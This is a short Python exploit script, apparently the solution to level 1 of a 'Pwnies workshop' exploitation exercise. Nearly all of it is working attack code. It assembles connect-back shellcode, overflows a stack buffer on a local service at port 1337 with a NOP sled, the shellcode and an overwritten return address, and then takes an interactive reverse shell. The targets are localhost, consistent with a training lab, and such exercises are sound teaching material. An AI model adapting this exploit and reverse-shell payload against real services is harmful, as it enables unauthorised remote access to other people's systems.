#!/usr/bin/env python

# Pwnies workshop server level 1

import sys, socket
from pwn import *
from pwn.i386.linux import *

log.waitfor('Counting to fifty')
for n in range(50):
    log.status(str(n))
    sleep(0.05)
log.succeeded()

handler = handler(timeout = 1)
shellcode = asm(connectback('localhost', handler.port))

sock = remote('localhost', 1337, timeout = 1)
sock.recvuntil('Your output to my input? Do your best!\n')

eip = p32(0x0804a080)
sock.send(nops(0xD4 - len(shellcode)) + shellcode + eip + '\n')
sock.close()

handler.wait_for_connection()
handler.interactive()

log.warning("I'm on a horse")
